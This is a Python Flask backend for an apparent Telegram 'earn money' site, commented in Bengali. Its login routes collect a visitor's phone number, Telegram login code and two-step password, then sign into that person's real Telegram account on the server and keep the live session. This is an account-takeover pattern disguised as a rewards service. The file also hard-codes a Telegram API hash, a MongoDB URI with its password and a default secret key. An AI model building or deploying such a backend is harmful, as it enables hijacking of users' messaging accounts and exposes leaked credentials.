import os
import asyncio # উপরে একবারে ইমপোর্ট করে রাখা ভালো
from flask import Flask, render_template, request, jsonify, session
from flask_cors import CORS
from pymongo import MongoClient
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "aaf_tele_earn_786")

# CORS সেটিংস
CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)

# আপনার কনফিগারেশন
API_ID = 36466824
API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"

# ডাটাবেস
client_db = MongoClient(MONGO_URI)
db = client_db['AAF_TeleEarn']
users_col = db['users']

# টেম্পোরারি ক্লায়েন্ট স্টোর
temp_clients = {}

@app.route('/')
@app.route('/login')
def login(): return render_template('login.html')

# ---------------- ওটিপি পাঠানোর ফাংশন (SYNC) ----------------
@app.route('/api/send_otp', methods=['POST'])
def send_otp():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({"success": False, "message": "Phone number missing"})

    try:
        # লুপ ফিক্স
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
        client.connect()
        
        result = client.send_code_request(phone)
        
        temp_clients[phone] = {
            "client": client,
            "hash": result.phone_code_hash,
            "loop": loop # লুপটিও সেভ করে রাখছি পরবর্তী ধাপের জন্য
        }
        
        return jsonify({"success": True, "message": "OTP Sent Successfully!"})
        
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

# ---------------- ভেরিফাই এবং লগইন (SYNC) ----------------
@app.route('/api/verify_login', methods=['POST'])
def verify_login():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    two_step = data.get('password')

    if phone not in temp_clients:
        return jsonify({"success": False, "message": "Session expired"})

    try:
        # আগের লুপটি পুনরুদ্ধার করা
        loop = temp_clients[phone]["loop"]
        asyncio.set_event_loop(loop)
        
        client = temp_clients[phone]["client"]
        h = temp_clients[phone]["hash"]
        
        # সাইন ইন
        user = client.sign_in(phone, code, phone_code_hash=h, password=two_step)
        
        user_data = {
            "telegram_id": user.id,
            "phone": phone,
            "name": f"{user.first_name or ''} {user.last_name or ''}",
            "joined": datetime.utcnow()
        }
        
        users_col.update_one(
            {"telegram_id": user.id},
            {"$set": user_data, "$setOnInsert": {"main_balance": 0}},
            upsert=True
        )
        
        session["uid"] = user.id
        return jsonify({"success": True, "uid": user.id})
        
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

# অন্য সব রাউটস
@app.route('/dashboard')
def dashboard(): return render_template('dashboard.html')

@app.route('/task')
def task(): return render_template('task.html')

@app.route('/trading')
def treading(): return render_template('treading.html')

@app.route('/account')
def account(): return render_template('account.html')

@app.route('/wallet')
def wallet(): return render_template('wallet.html')

@app.route('/admin')
def admin_page(): return render_template('admin.html')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
